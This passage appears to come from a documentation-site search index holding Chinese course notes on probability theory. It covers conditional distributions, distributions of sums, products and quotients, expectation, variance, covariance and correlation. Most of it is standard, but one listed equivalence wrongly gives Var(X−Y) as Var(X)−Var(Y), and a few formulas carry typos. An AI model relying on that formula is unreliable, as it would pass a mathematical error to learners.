\\(X,Y\\) \u72ec\u7acb\u65f6\uff0c\u6761\u4ef6\u5206\u5e03\u6210\u4e3a\u65e0\u6761\u4ef6\u5206\u5e03.</p> <p>\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\u7684\u6761\u4ef6\u5206\u5e03</p> <p>\u5bf9\u4e8e\u4e8c\u7ef4\u8fde\u7eed\u578b\u53d8\u91cf \\((X,Y)\\)\uff0c\u82e5\u4e0b\u8ff0\u6781\u9650\u5b58\u5728\uff0c\u5219\u79f0\u4e3a \\(Y=y\\) \u6761\u4ef6\u4e0b \\(X\\) \u7684\u6761\u4ef6\u5206\u5e03\u51fd\u6570\uff0c\u8bb0\u4e3a \\(F_{X|Y=y}(x)\\).</p> \\[ \\lim_{\\varepsilon\\to 0}\\text{Pr}(X\\le x|y\\le Y&lt;y+\\varepsilon)=\\lim_{\\varepsilon\\to 0}\\dfrac{\\text{Pr}(X\\le x,y\\le Y&lt;y+\\varepsilon)}{\\text{Pr}(y\\le Y&lt;y+\\varepsilon)}\\qquad \\forall \\varepsilon&gt;0 \\] <p>\u5bf9\u5b9a\u4e49\u5c55\u5f00\u5f97\u5230\uff1a</p> \\[ F_{X|Y=y}(x)=\\int_{-\\infty}^x\\dfrac{p(u,y)}{p_Y(y)}\\mathrm{d}u \\] <p>\u6c42\u5bfc\u5f97\u5230\u6761\u4ef6\u5bc6\u5ea6\u51fd\u6570\uff1a</p> \\[ p_{X|Y=y}(x)=\\dfrac{p(x,y)}{p_Y(y)} \\] <p>\u540c\u7406\u6709 \\(X=x\\) \u6761\u4ef6\u4e0b \\(Y\\) \u7684\u6761\u4ef6\u5206\u5e03\u51fd\u6570\u4e0e\u6761\u4ef6\u5bc6\u5ea6\u51fd\u6570\uff1a</p> \\[ F_{Y|X=x}(y)=\\int_{-\\infty}^{y}\\dfrac{p(x,v)}{p_X(x)}\\mathrm{d}v,p_{Y|X=x}=\\dfrac{p(x,y)}{p_X(x)} \\] <p>\u663e\u7136\uff0c\u5f53 \\(X,Y\\) \u72ec\u7acb\u65f6\uff0c\u6761\u4ef6\u5206\u5e03\u6210\u4e3a\u65e0\u6761\u4ef6\u5206\u5e03.</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-3-%E4%BA%8C%E7%BB%B4%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/#_5","title":"\u4e8c\u7ef4\u968f\u673a\u53d8\u91cf\u51fd\u6570\u7684\u5206\u5e03","text":"<p>\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\u51fd\u6570\u7684\u5206\u5e03\uff1a</p> <p>\u8bbe\u4e8c\u7ef4\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf (X,Y) \u7684\u5206\u5e03\u5f8b\u4e3a \\(\\mathrm{Pr}(X=x_i,Y=y_j)=p_{i,j},i,j=1,2,\\cdots\\)\uff0c\u82e5 (X,Y) \u7684\u51fd\u6570 \\(Z = g(X,Y)\\)\uff0c\u56e0\u5176\u53d6\u503c\u96c6\u5408\u5fc5\u7136\u53ef\u6570\uff0c\u6545\u8bbe\u5176\u53ef\u80fd\u53d6\u503c\u4e3a \\(z_k, k=1,2,\\cdots\\)\uff0c\u5176\u6982\u7387\u5206\u5e03\u4e3a\uff1a</p> \\[ \\mathrm{Pr}(Z=z_k)=\\sum_{g(x_i,y_j)=z_k}p_{i,j} \\] <p>\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\u51fd\u6570\u7684\u5206\u5e03</p> <p>\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf \\((X,Y)\\) \u7684\u51fd\u6570 \\(Z=g(X,Y)\\) \u53ef\u80fd\u662f\u79bb\u6563\u578b\uff0c\u4e5f\u53ef\u80fd\u662f\u8fde\u7eed\u578b.</p> <p>\u5bf9\u4e8e\u524d\u8005\uff0c\u53ef\u4ee5\u679a\u4e3e\u5176\u53d6\u503c\u5f97\u5230 \\(Z\\) \u7684\u5206\u5e03\u5f8b.</p> <p>\u5bf9\u4e8e\u540e\u8005\uff0c\u901a\u5e38\u5229\u7528\u5206\u5e03\u51fd\u6570\u6cd5\u6765\u6c42\u89e3\uff0c\u5373</p> \\[ F_Z(z)=\\mathrm{Pr}(g(X,Y)\\le Z)=\\iint_{D_z}p(x,y)\\mathrm{d}x\\mathrm{d}y.D_z=\\{(x,y)|g(x,y)\\le z\\} \\] <p>\u6c42\u51fa\u5176\u5206\u5e03\u51fd\u6570\u540e\u6c42\u5bfc\u5f97\u5230\u6982\u7387\u5bc6\u5ea6 \\(p_Z(z)\\).</p> <p>\u4ee5\u4e0b\u4e3a\u96c6\u4e2d\u5e38\u7528\u51fd\u6570\u7684\u5206\u5e03\u516c\u5f0f</p> <p>\u548c\u4e0e\u5dee\u7684\u5206\u5e03</p> <p>\u901a\u8fc7\u5206\u5e03\u51fd\u6570\u6cd5\u548c\u4e00\u4e9b\u8fd8\u539f\u64cd\u4f5c\u53ef\u4ee5\u5f97\u5230\uff0c\u5bf9\u4e8e \\(Z=X+Y\\)\uff1a</p> \\[ p_Z(z)=\\int_{-\\infty}^{+\\infty}p(x,z-x)\\mathrm{d}x=\\int_{-\\infty}^{+\\infty}p(z-y,y)\\mathrm{d}y\\\\ \\] <p>\u7279\u522b\u5730\uff0c\u5f53 \\(X\\) \u548c \\(Y\\) \u72ec\u7acb\u65f6\uff0c\u5f0f\u5b50\u8f6c\u5316\u4e3a \\(p_X\\) \u548c \\(p_Y\\) \u7684\u5377\u79ef\uff0c\u6545\u800c\u4e0b\u8ff0\u516c\u5f0f\u4ea6\u79f0\u4e3a\u5377\u79ef\u516c\u5f0f\uff1a</p> \\[ p_Z(z)=\\int_{-\\infty}^{+\\infty}p_X(x)p_Y(z-x)\\mathrm{d}x=\\int_{-\\infty}^{+\\infty}p_X(z-y)p_Y(y)\\mathrm{d}y\\\\ \\] <p>\u7c7b\u4f3c\u5730\uff0c\u5bf9\u4e8e \\(Z=X-Y\\)\uff0c\u6709\uff1a</p> \\[ p_Z(z)=\\int_{-\\infty}^{+\\infty}p(x,x-z)\\mathrm{d}x=\\int_{-\\infty}^{+\\infty}p(z+y,y)\\mathrm{d}y\\\\ \\] <p>\u79ef\u4e0e\u5546\u7684\u5206\u5e03</p> <p>\u5bf9\u4e8e \\(Z=XY\\)\uff1a</p> \\[ p_Z(z)=\\int_{-\\infty}^{+\\infty}p\\left(x,\\dfrac{z}{x}\\right)\\dfrac{\\mathrm{d}x}{|x|}=\\int_{-\\infty}^{+\\infty}p\\left(\\dfrac{z}{y},y\\right)\\dfrac{\\mathrm{d}y}{|y|} \\] <p>\u5bf9\u4e8e \\(Z=X/Y\\)\uff1a</p> \\[ p_Z(z)=\\int_{-\\infty}^{+\\infty}p(x,zx)|x|\\mathrm{d}x=\\int_{-\\infty}^{+\\infty}p(zy,y)|y|\\mathrm{d}y \\] <p>\\(\\max\\) \u4e0e \\(\\min\\) \u7684\u5206\u5e03</p> <p>\u8bbe\u968f\u673a\u53d8\u91cf \\(X\\) \u548c \\(Y\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u4e14 \\(M=\\max(X,Y),N=\\min(X,Y)\\)\uff0c\u5219\uff1a</p> \\[ F_M(z)=F_X(z)F_Y(z),F_N(z)=1-(1-F_X(z))(1-F_Y(z)) \\] <p>\u4e0a\u8ff0\u7ed3\u8bba\u53ef\u4ee5\u63a8\u5e7f\u5230 \\(n\\) \u4e2a\u76f8\u4e92\u72ec\u7acb\u7684\u968f\u673a\u53d8\u91cf\uff1a\\(M=\\max(X_1,X_2,\\cdots,X_n),N=\\min(X_1,X_2,\\cdots,X_n)\\)\uff1a</p> \\[ F_M(z)=\\prod_{i=1}^{n}F_{X_{i}}(z),1-F_N(z)=\\prod_{i=1}^{n}(1-F_{X_i}(z)) \\] <p>\u5206\u5e03\u51fd\u6570\u7684\u5206\u5e03</p> <p>\u82e5\u968f\u673a\u53d8\u91cf \\(\\xi\\) \u7684\u5206\u5e03\u51fd\u6570\u4e3a \\(F(x)=\\mathrm{Pr}(\\xi&lt;x)\\)\uff0c\u56e0 \\(F(x)\\) \u975e\u964d\uff0c\u6545\u53ef\u5b9a\u4e49\u5176\u53cd\u51fd\u6570\uff1a</p> \\[ F^{-1}(y)=\\inf\\{x|F(x)&gt;y\\}\\qquad \\forall y\\in[0,1] \\] <p>\u5bf9\u4e8e\u968f\u673a\u53d8\u91cf \\(\\theta=F(\\xi)\\) \u7684\u5206\u5e03\uff0c\u6211\u4eec\u6709\uff1a</p> \\[ \\mathrm{Pr}(\\theta&lt;x)=\\mathrm{Pr}(F(\\xi)&lt;x)=\\mathrm{Pr}(\\xi &lt;F^{-1}(x))=F(F^{-1}(x))=x \\] <p>\u6545\u800c \\(\\theta\\sim U[0,1]\\).</p> <p>\u6ce8\u610f\uff1a\u8fd9\u4e2a\u7ed3\u8bba\u53cd\u8fc7\u6765\u6709\u66f4\u91cd\u8981\u7684\u5e94\u7528\u610f\u4e49\uff1a\u82e5 \\(\\theta\\sim U[0,1]\\)\uff0c\u5bf9\u4efb\u610f\u5206\u5e03\u51fd\u6570 \\(F(x)\\)\uff0c\u4ee4 \\(\\xi = F^{-1}(\\theta)\\)\uff0c\u5373\u53ef\u4f7f\u5f97 \\(\\xi\\) \u6210\u4e3a\u670d\u4ece\u5206\u5e03\u51fd\u6570 \\(F(x)\\) \u7684\u968f\u673a\u53d8\u91cf. \u8fd9\u6837\u6211\u4eec\u53ea\u8981\u80fd\u751f\u6210 \\(\\theta\\)\uff0c\u5c31\u80fd\u5229\u7528\u8be5\u53d8\u6362\u751f\u6210 \\(\\xi\\)\uff0c\u8fd9\u662f\u4e00\u79cd\u6781\u5176\u5e38\u89c1\u7684\u91c7\u6837\u65b9\u6cd5.</p> <p></p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-4-%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/","title":"Ch.4 \u968f\u673a\u53d8\u91cf\u7684\u6570\u5b57\u7279\u5f81","text":""},{"location":"in_class_learning/semester_3/probability_theory/Ch-4-%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/#_1","title":"\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\u7684\u6570\u5b66\u671f\u671b/\u671f\u671b/\u5747\u503c","text":"<p>\u5b9a\u4e49\uff1a\u8bbe\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf X \u7684\u5206\u5e03\u5f8b\u4e3a \\(\\text{Pr}(X=x_i)=p_i,i=1,2,\\cdots\\)\uff0c\u82e5\u7ea7\u6570 \\(\\sum_{i=1}^{+\\infty} |x_i|p_i\\) \u6536\u655b\uff0c\u5219\u79f0 \\(\\sum_{i=1}^{+\\infty} x_ip_i\\) \u4e3a \\(X\\) \u7684\u6570\u5b66\u671f\u671b\uff08expected value\uff09\uff0c\u8bb0\u4e3a \\(\\text{E}X\\) \u6216 \\(EX\\)\uff0c\u5373</p> \\[ \\text{E}X=\\sum_{i=1}^{+\\infty} x_ip_i \\] <p>\u6570\u5b66\u671f\u671b\u4e0d\u5b58\u5728\uff1a\u82e5 \\(\\sum_{i=1}^{+\\infty} |x_i|p_i\\) \u53d1\u6563\uff0c\u5219\u79f0 \\(X\\) \u7684\u6570\u5b66\u671f\u671b\u4e0d\u5b58\u5728.</p> <p>\u8981\u6c42\u7ea7\u6570\u7edd\u5bf9\u6536\u655b\u7684\u539f\u56e0\uff1a \\(\\sum_{i=1}^{+\\infty} x_ip_i\\) \u5fc5\u987b\u4e0d\u56e0 \\(x_i\\) \u6b21\u5e8f\u7684\u53d8\u5316\u800c\u6539\u53d8\uff0c\u6545\u800c\u4ec5\u8981\u6c42\u6761\u4ef6\u6536\u655b\u662f\u4e0d\u591f\u7684\uff0c\u5fc5\u987b\u8981\u6c42\u5176\u7edd\u5bf9\u6536\u655b\u3002</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-4-%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/#_2","title":"\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\u7684\u6570\u5b66\u671f\u671b/\u671f\u671b/\u5747\u503c","text":"<p>\u5b9a\u4e49\uff1a\u8bbe\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u5bc6\u5ea6\u51fd\u6570\u4e3a \\(p(x)\\)\uff0c\u82e5\u79ef\u5206 \\(\\int_{-\\infty}^{+\\infty} |x|p(x)\\mathrm{d}x &lt;+\\infty\\)\uff0c\u5219\u79f0 \\(\\int_{-\\infty}^{+\\infty} xp(x)\\mathrm{d}x\\) \u4e3a \\(X\\) \u7684\u6570\u5b66\u671f\u671b\u6216\u5747\u503c\uff0c\u8bb0\u4e3a \\(\\text{E}X\\) \u6216 \\(EX\\)\uff0c\u5373</p> \\[ \\text{E}X=\\int_{-\\infty}^{+\\infty} xp(x)\\mathrm{d}x \\] <p>\u671f\u671b\u4e0d\u5b58\u5728\u7684\u4f8b\u5b50\uff1a\u8fde\u7eed\u578b\u67ef\u897f\uff08Cauchy\uff09\u5206\u5e03 \\(p(x)=\\dfrac{1}{\\pi(1+x^2)},x\\in(-\\infty,+\\infty)\\).</p> <p>\u968f\u673a\u53d8\u91cf\u7684\u51fd\u6570\uff1a\u8bbe\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u51fd\u6570 \\(Y=g(X)\\) \u4e5f\u662f\u4e00\u4e2a\u968f\u673a\u53d8\u91cf\uff0c\u5219\u6709\uff1a</p> <p>(1) \u82e5 \\(X\\) \u4e3a\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\uff0c\u5176\u5206\u5e03\u5f8b\u4e3a \\(\\text{Pr}(X=x_k)=p_k,k=1,2,\\cdots\\)\uff0c\u82e5 \\(\\sum_{k=1}^{+\\infty}|g(x_k)|p_k\\) \u6536\u655b\uff0c\u5219</p> \\[ \\text{E}Y=\\sum_{k=1}^{+\\infty}g(x_k)p_k \\] <p>(2) \u82e5 \\(X\\) \u4e3a\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\uff0c\u5176\u5bc6\u5ea6\u51fd\u6570\u4e3a p(x)\uff0c\u82e5 \\(\\int_{-\\infty}^{+\\infty}|g(x)|p(x)\\mathrm{d}x&lt;+\\infty\\)\uff0c\u5219</p> \\[ \\text{E}Y=\\int_{-\\infty}^{+\\infty}g(x)p(x)\\mathrm{d}x  \\] <p>\u8be5\u5b9a\u7406\u53ef\u4ee5\u88ab\u63a8\u5e7f\u5230\u968f\u673a\u5411\u91cf\u60c5\u5f62\uff1a\u8bbe\u968f\u673a\u5411\u91cf \\((X,Y)\\) \u7684\u51fd\u6570 \\(Z=g(X,Y)\\) \u662f\u4e00\u4e2a\u968f\u673a\u53d8\u91cf\uff0c\u5219\uff1a</p> <p>(1) \u82e5 \\((X,Y)\\) \u4e3a\u79bb\u6563\u578b\u968f\u673a\u5411\u91cf\uff0c\u5176\u8054\u5408\u5206\u5e03\u5f8b\u4e3a \\(\\text{Pr}(X=x_i,Y=y_j)=p_{i,j},i,j=1,2,\\cdots\\)\uff0c\u82e5 \\(\\sum_{i=1}^{+\\infty}\\sum_{j=1}^{+\\infty}|g(x_i,y_j)|p_{i,j}\\) \u6536\u655b\uff0c\u5219</p> \\[ \\text{E}Z=\\sum_{i=1}^{+\\infty}\\sum_{j=1}^{+\\infty}g(x_i,y_j)p_{i,j} \\] <p>(2) \u82e5 \\((X,Y)\\) \u4e3a\u8fde\u7eed\u578b\u968f\u673a\u5411\u91cf\uff0c\u5176\u8054\u5408\u5bc6\u5ea6\u4e3a \\(p(x,y)\\)\uff0c\u82e5\uff1a\\(\\int_{-\\infty}^{+\\infty}\\int_{-\\infty}^{+\\infty} |g(x,y)|p(x,y)\\mathrm{d}x\\mathrm{d}y&lt;+\\infty\\)\uff0c\u5219</p> \\[ \\text{E}Z=\\int_{-\\infty}^{+\\infty}\\int_{-\\infty}^{+\\infty} g(x,y)p(x,y)\\mathrm{d}x\\mathrm{d}y \\] <p>\u671f\u671b\u7684\u6027\u8d28\uff1a</p> <ol> <li>\u8bbe \\(a\\) \u4e3a\u5e38\u6570\uff0c\u5219 \\(\\text{E}(a)=a\\).</li> <li>\u7ebf\u6027\u6027\uff1a\u5bf9\u4efb\u610f\u6709\u9650\u5e38\u6570 \\(a,b\\)\uff0c\u6211\u4eec\u6709 \\(\\text{E}(aX+bY)=a\\text{E}X+b\\text{E}Y\\).</li> <li>\u82e5 \\(X,Y\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u5219 \\(\\text{E}(XY)=\\text{E}X\\cdot\\text{E}Y\\).</li> </ol>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-4-%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/#_3","title":"\u65b9\u5dee\u4e0e\u5747\u65b9\u5dee/\u6807\u51c6\u5dee","text":"<p>\u5b9a\u4e49\uff1a\u8bbe \\(X\\) \u662f\u4e00\u4e2a\u968f\u673a\u53d8\u91cf\uff0c\u82e5 \\(\\text{E}(X^2)&lt;+\\infty\\)\uff0c\u5219\u79f0 \\(\\text{E}(X-\\text{E}X)^2\\) \u4e3a\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u65b9\u5dee\uff08variance\uff09\uff0c\u8bb0\u4e3a \\(\\text{D}X\\) \u6216 \\(\\text{Var}(X)\\)\uff0c\u540c\u65f6\u79f0 \\(\\sqrt{\\text{Var}(X)}\\) \u4e3a \\(X\\) \u7684\u5747\u65b9\u5dee\u6216\u6807\u51c6\u5dee\uff0c\u8bb0\u4e3a \\(\\sigma(X)\\).</p> <p>\u8ba1\u7b97\u516c\u5f0f\uff1a</p> <p>(1) \u82e5 \\(X\\) \u4e3a\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\uff0c\u5176\u5206\u5e03\u5f8b\u4e3a \\(\\text{Pr}(X=x_k)=p_k,k=1,2,\\cdots\\)\uff0c\u5219</p> \\[ \\text{Var}(X)=\\sum_{k=1}^{+\\infty}(x_k-\\text{E}X)^2\\text{Pr}(X=x_k) \\] <p>(2) \u82e5 \\(X\\) \u4e3a\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\uff0c\u5176\u5bc6\u5ea6\u51fd\u6570\u4e3a \\(p(x)\\)\uff0c\u5219</p> \\[ \\text{Var}(X)=\\int_{-\\infty}^{+\\infty} (x-\\text{E}X)^2p(x)\\mathrm{d}x \\] <p>(3) \u6b64\u5916\u6839\u636e\u671f\u671b\u7684\u7ebf\u6027\u6027\uff0c\u6709\u8ba1\u7b97\u516c\u5f0f\uff1a</p> \\[ \\text{Var}(X)=\\text{E}(X^2)-\\text{E}^2(X) \\] <p>\u65b9\u5dee\u7684\u6027\u8d28\uff1a</p> <p>(1) \u5bf9\u4e8e\u4efb\u610f\u5e38\u6570 \\(a\\)\uff0c\u6709 \\(\\text{Var}(a)=0\\).</p> <p>(2) \u8bbe \\(a,b\\) \u4e3a\u4efb\u610f\u6709\u9650\u5e38\u6570\uff0c\u82e5 \\(X\\) \u7684\u65b9\u5dee\u5b58\u5728\uff0c\u5219 \\(\\text{Var}(aX+b)=a^2\\text{Var}(X)\\).</p> <p>(3) \u5bf9\u4efb\u610f\u5b58\u5728\u65b9\u5dee\u7684\u968f\u673a\u53d8\u91cf \\(X, Y\\)\uff0c\u6709\uff1a</p> \\[ \\text{Var}(X\\pm Y)=\\text{Var}(X)+ \\text{Var}(Y)\\pm 2\\text{E}((X-\\text{E}X)(Y-\\text{E}Y)) \\]"},{"location":"in_class_learning/semester_3/probability_theory/Ch-4-%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/#chebyshevs-inequality","title":"\u5207\u6bd4\u96ea\u592b\u4e0d\u7b49\u5f0f\uff08Chebyshev\u2019s inequality\uff09","text":"<p>\u5b9a\u7406\uff1a\u8bbe\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u671f\u671b \\(\\text{E}X\\) \u548c\u65b9\u5dee \\(\\text{Var}(X)\\) \u5747\u5b58\u5728\uff0c\u5219\u5bf9\u4e8e\u4efb\u610f\u7684 \\(\\varepsilon&gt;0\\)\uff0c\u6709\uff1a</p> \\[ \\text{Pr}(|X-\\text{E}X|\\ge \\varepsilon)\\le\\dfrac{\\text{Var}(X)}{\\varepsilon^2}  \\] <p>\u63a8\u8bba\uff1a\u82e5 \\(\\text{Var}X=0\\)\uff0c\u5219 \\(X\\equiv \\text{E}X\\)\uff0c\u5373 \\(X\\) \u662f\u4e00\u4e2a\u5e38\u6570.</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-4-%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/#_4","title":"\u534f\u65b9\u5dee\u4e0e\u76f8\u5173\u7cfb\u6570","text":"<p>\u534f\u65b9\u5dee\uff1a\u5bf9\u968f\u673a\u53d8\u91cf \\(X\\) \u548c \\(Y\\)\uff0c\u82e5 \\(\\text{E}X\\) \u548c \\(\\text{E}Y\\) \u548c \\(\\text{E}(XY)\\) \u5747\u5b58\u5728\uff0c\u5219\u79f0 \\(\\text{E}((X-\\text{E}X)(Y-\\text{E}Y))\\) \u4e3a \\(X\\) \u548c \\(Y\\) \u7684\u534f\u65b9\u5dee\uff08covariance\uff09\uff0c\u8bb0\u4e3a \\(\\text{Cov}(X,Y)\\)\uff0c\u5373</p> \\[ \\text{Cov}(X,Y)=\\text{E}((X-\\text{E}X)(Y-\\text{E}Y)) \\] <p>\u5176\u53ef\u4ee5\u770b\u4f5c\u662f\u65b9\u5dee\u7684\u63a8\u5e7f\uff1a\\(\\text{Var}(X)=\\text{Cov}(X,X)\\).</p> <p>\u8ba1\u7b97\u516c\u5f0f\uff1a</p> \\[ \\text{Cov}(X,Y)=\\text{E}(XY)-\\text{E}X\\cdot \\text{E}Y \\] <p>\u534f\u65b9\u5dee\u7684\u6027\u8d28\uff1a</p> <p>(1) \u5bf9\u79f0\u6027\uff1a\\(\\text{Cov}(X,Y)=\\text{Cov}(Y,X)\\).</p> <p>(2) \u5bf9\u5e38\u6570 \\(a,b,c,d\\in\\mathbb{R}\\)\uff0c\u6709 \\(\\text{Cov}(aX+c,bY+d)=ab\\text{Cov}(X,Y)\\).</p> <p>(3) \\(\\text{Cov}(X_1+X_2,Y)=\\text{Cov}(X_1,Y)+\\text{Cov}(X_2,Y)\\).</p> <p>(4) \u82e5 \\(X\\) \u548c \\(Y\\) \u72ec\u7acb\uff0c\\(\\text{Cov}(X,Y)=0\\).</p> <p>\u6ce8\uff1a(4) \u53ef\u7531\u671f\u671b\u6027\u8d28\uff1a\u72ec\u7acb\u53d8\u91cf\u4e4b\u79ef\u4e4b\u671f\u671b\u4e3a\u53d8\u91cf\u671f\u671b\u4e4b\u79ef\u548c\u534f\u65b9\u5dee\u8ba1\u7b97\u516c\u5f0f\u7acb\u5f97.</p> <p>\u67ef\u897f-\u65bd\u74e6\u8328\u4e0d\u7b49\u5f0f\uff08Cauchy-Schwarz inequality\uff09\u5728\u6982\u7387\u8bba\u4e2d\u7684\u5f62\u5f0f</p> <p>\u8bbe\u968f\u673a\u53d8\u91cf \\(X\\) \u548c \\(Y\\) \u7684\u65b9\u5dee\u5747\u5b58\u5728\uff0c\u5219\uff1a</p> \\[ \\text{Cov}^2(X,Y)\\le \\text{Var}(X)\\cdot \\text{Var}(Y) \\] <p>\u7b49\u53f7\u6210\u7acb\u5f53\u4e14\u4ec5\u5f53\u5b58\u5728\u4e0d\u5168\u4e3a\u96f6\u7684\u5e38\u6570 \\(a\\) \u548c \\(b\\) \u4f7f\u5f97 \\(\\text{Pr}(Y=aX+b)=1\\).</p> <ul> <li> <p>proof</p> <p>proof.</p> <p>\u5bf9\u4efb\u610f\u7684 \\(t\\in\\mathbb{R}\\)\uff0c\u5b9a\u4e49\u51fd\u6570\uff1a</p> \\[ u(t)=\\text{E}(t(X-\\text{E}X)-(Y-\\text{E}Y))^2 \\] <p>\u7531\u671f\u671b\u7ebf\u6027\u6027\u77e5\uff1a</p> \\[ u(t)=t^2\\text{Var}(X)-2t\\text{Cov}(X,Y)+\\text{Var}(Y) \\] <p>\u663e\u7136 \\(u(t)\\ge 0\\)\uff0c\u7531\u5224\u522b\u5f0f\u77e5\uff1a</p> \\[ \\text{Cov}^2(X,Y)\\le \\text{Var}(X)\\cdot \\text{Var}(Y) \\] <p>\u7b49\u53f7\u6210\u7acb\u7684\u6761\u4ef6\u662f \\(u(t)=0\\) \u6709\u4e00\u4e2a\u4e8c\u91cd\u5b9e\u6839\uff0c\u8bbe\u4e3a \\(t_0\\)\uff0c\u968f\u5373\u6709\uff1a</p> \\[ \\text{Var}(t_0(X-\\text{E}X)-(Y-\\text{E}Y))={t_0}^{2}\\text{Var}(X)-2t_0\\text{Cov}(X,Y)+\\text{Var}(Y)=u(t_0)=0 \\] <p>\u968f\u5373\u6839\u636e\u65b9\u5dee\u7684\u8ba1\u7b97\u516c\u5f0f\u5f97\u77e5\uff1a\\(\\text{E}(t_0(X-\\text{E}X)-(Y-\\text{E}Y))=0\\).</p> <p>\u6839\u636e\u65b9\u5dee\u7684\u6027\u8d28\uff1a\\(\\text{Pr}(t_0(X-\\text{E}X)-(Y-\\text{E}Y)=0)=1\\).</p> </li> </ul> <p>\u6807\u51c6\u5316\u968f\u673a\u53d8\u91cf\uff1a\u5df2\u77e5\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u5747\u503c \\(\\text{E}X\\) \u548c\u65b9\u5dee \\(\\text{Var}(X)\\)\uff0c\u505a\u5982\u4e0b\u53d8\u6362\uff1a</p> \\[ X^*=\\dfrac{X-\\text{E}X}{\\sqrt{\\text{Var}(X)}} \\] <p>\u5219 \\(\\text{E}X^*=0, \\text{Var}(X^*)=1\\). \u79f0 \\(X^*\\) \u4e3a \\(X\\) \u7684\u6807\u51c6\u5316\u968f\u673a\u53d8\u91cf.</p> <p>\u76f8\u5173\u7cfb\u6570\uff1a\u8bbe\u968f\u673a\u53d8\u91cf X \u548c Y \u7684\u65b9\u5dee\u5747\u5b58\u5728\uff0c\u4e14 \\(\\text{Var}(X),\\text{Var}(Y)&gt;0\\)\uff0c\u5219\u79f0</p> \\[ \\text{Corr}(X,Y)=\\rho_{XY}=\\dfrac{\\text{Cov}(X,Y)}{\\sqrt{\\text{Var}(X)\\text{Var}(Y)}} \\] <p>\u4e3a \\(X\\) \u548c \\(Y\\) \u7684\u76f8\u5173\u7cfb\u6570.</p> <p>\u6b63\u76f8\u5173/\u8d1f\u76f8\u5173\uff1a\u82e5 \\(\\text{Corr}(X,Y)&gt;0\\)\uff0c\u5219\u79f0 \\(X\\) \u548c \\(Y\\) \u6b63\u76f8\u5173\uff0c\u82e5 \\(\\text{Corr}(X,Y)&lt;0\\)\uff0c\u5219\u79f0 \\(X\\) \u548c \\(Y\\) \u8d1f\u76f8\u5173.</p> <p>\u76f8\u5173\u7cfb\u6570\u7684\u6027\u8d28\uff1a</p> <p>(1) \\(\\text{Corr}(X,Y)=\\text{Cov}(X^*,Y^*)\\)</p> <p>(2) \\(|\\text{Corr}(X,Y)|\\le 1\\). \u7b49\u53f7\u6210\u7acb\u7684\u5145\u8981\u6761\u4ef6\u662f\u5b58\u5728\u4e0d\u540c\u65f6\u4e3a\u96f6\u7684\u5e38\u51fd\u6570 \\(a,b\\) \u4f7f\u5f97 \\(\\text{Pr}(Y=aX+b)=1\\)\uff0c\u5373 \\(X\\) \u548c \\(Y\\) \u4ee5\u6982\u7387 \\(1\\) \u6709\u7ebf\u6027\u5173\u7cfb.</p> <p>(3) \u7ebf\u6027\u65e0\u5173/\u4e0d\u76f8\u5173\uff1a\u968f\u673a\u53d8\u91cf \\(X\\) \u548c \\(Y\\) \u7684\u76f8\u5173\u7cfb\u6570 \\(\\text{Corr}(X,Y)=0\\). \u82e5\u968f\u673a\u53d8\u91cf \\(X\\) \u548c \\(Y\\) \u72ec\u7acb\uff0c\u5219 \\(X\\) \u548c \\(Y\\) \u4e0d\u76f8\u5173\uff0c\u53cd\u4e4b\u672a\u5fc5\u6210\u7acb.</p> <p>\u4e0d\u76f8\u5173\u7684\u7b49\u4ef7\u6761\u4ef6\uff1a\u4ee5\u4e0b\u56db\u4e2a\u547d\u9898\u76f8\u4e92\u7b49\u4ef7\uff1a</p> <p>(1) \\(\\text{Corr}(X,Y)=0\\).</p> <p>(2) \\(\\text{Cov}(X,Y)=0\\).</p> <p>(3) \\(\\text{E}(XY)=\\text{E}(X)\\text{E}(Y)\\).</p> <p>(4) \\(\\text{Var}(X\\pm Y)=\\text{Var}(X)\\pm \\text{Var}(Y)\\). </p> 